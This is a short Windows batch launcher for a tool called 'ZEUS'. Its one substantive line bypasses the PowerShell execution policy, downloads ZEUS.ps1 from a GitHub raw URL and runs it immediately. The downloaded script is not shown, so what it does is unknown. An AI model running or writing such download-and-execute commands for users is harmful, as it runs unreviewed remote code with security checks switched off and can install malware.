@echo off
setlocal EnableExtensions
cd /d "%~dp0"
echo Starting ZEUS. Leave this window open.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/madexps3-tech/zeus-desktop-fix/main/ZEUS.ps1' -OutFile (Join-Path (Get-Location) 'ZEUS.ps1'); & (Join-Path (Get-Location) 'ZEUS.ps1')"
echo.
pause
